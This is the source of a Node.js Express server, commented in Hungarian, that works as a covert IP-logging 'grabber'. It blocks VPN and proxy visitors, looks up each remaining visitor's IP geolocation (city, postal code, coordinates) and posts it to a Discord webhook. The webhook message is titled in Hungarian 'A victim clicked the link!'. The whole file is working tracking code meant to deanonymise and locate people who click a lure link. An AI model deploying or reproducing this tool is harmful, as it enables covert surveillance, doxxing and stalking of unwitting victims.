const express = require('express');
const axios = require('axios');
require('dotenv').config();
const path = require('path');
const app = express();
const port = process.env.PORT || 3000;

// Statikus fájlok kiszolgálása (CSS, JS, stb.)
app.use(express.static(path.join(__dirname, 'public')));

// Webhook URL és IPINFO token a .env fájlból
const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
const altWebhookUrl = process.env.DISCORD_ALT_WEBHOOK_URL;
const ipinfoToken = process.env.IPINFO_TOKEN;
const proxyCheckApiKey = process.env.PROXYCHECK_API_KEY; // ProxyCheck API kulcs

// Az alapértelmezett útvonal (/) kiszolgálja az index.html-t
app.get('/', async (req, res) => {
    const userIp = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();

    try {
        // ProxyCheck API használata a VPN/Proxy ellenőrzéshez
        const proxyCheckResponse = await axios.get(`https://proxycheck.io/v2/${userIp}?key=${proxyCheckApiKey}&vpn=1&proxy=1`);
        const proxyCheckData = proxyCheckResponse.data;

        // Ellenőrizzük, hogy VPN vagy Proxy használata van-e
        if (proxyCheckData[userIp].vpn === "yes" || proxyCheckData[userIp].proxy === "yes") {
            // Ha VPN vagy Proxy van, blokkoljuk a hozzáférést
            console.log(`VPN vagy Proxy használat észlelve: IP: ${userIp}`);
            return res.status(403).send("Hozzáférés tilos: VPN vagy Proxy használata nem engedélyezett.");
        }

        // Ha nincs VPN vagy Proxy, akkor a weboldal kiszolgálása folytatódik
        res.sendFile(path.join(__dirname, 'index.html'));  // Az index.html fájl kiszolgálása

    } catch (error) {
        console.error('Hiba:', error.message);
        res.status(500).send('Belső hiba történt a VPN ellenőrzés során.');
    }
});

// /get-webhook-url útvonal a webhook URL-ek elküldéséhez
app.get('/get-webhook-url', (req, res) => {
    res.json({ webhookUrl, altWebhookUrl });
});

// /send-ip útvonal
app.get('/send-ip', async (req, res) => {
    const userIp = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();

    try {
        // ProxyCheck API használata a VPN/Proxy ellenőrzéshez
        const proxyCheckResponse = await axios.get(`https://proxycheck.io/v2/${userIp}?key=${proxyCheckApiKey}&vpn=1&proxy=1`);
        const proxyCheckData = proxyCheckResponse.data;

        // Ellenőrizzük, hogy VPN vagy Proxy használat van-e
        if (proxyCheckData[userIp].vpn === "yes" || proxyCheckData[userIp].proxy === "yes") {
            // Ha VPN vagy Proxy van, nem küldjük el az IP-t Discordra
            console.log(`VPN vagy Proxy használat észlelve: IP: ${userIp}`);
            return res.status(403).send("Hozzáférés tilos: VPN vagy Proxy használata nem engedélyezett.");
        }

        // Ha nincs VPN vagy Proxy, akkor folytatódik az IP információk lekérése
        const geoResponse = await axios.get(`https://ipinfo.io/${userIp}?token=${ipinfoToken}`);
        const geoData = geoResponse.data;

        const [latitude, longitude] = (geoData.loc || '0,0').split(',');

        const message = {
            username: "Helyszíni Naplózó <3",
            avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
            content: `<@1095731086513930260>`,
            embeds: [{
                title: "Egy áldozat rákattintott a linkre!",
                description: `**IP-cím >>** ${userIp}\n**Hálózat >>** ${geoData.org || 'N/A'}\n**Város >>** ${geoData.city || 'N/A'}\n**Régió >>** ${geoData.region || 'N/A'}\n**Ország >>** ${geoData.country || 'N/A'}\n**Irányítószám >>** ${geoData.postal || 'N/A'}\n**Szélesség >>** ${latitude}\n**Hosszúság >>** ${longitude}`,
                color: 0x800080
            }]
        };

        // Webhook küldése
        await axios.post(webhookUrl, message);
        res.json({ ip: userIp }); // Visszaadja az IP-t JSON formátumban
    } catch (error) {
        console.error('Hiba:', error.message);
        res.send('Nem sikerült az IP lekérdezés vagy Discord küldés.');
    }
});

app.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});
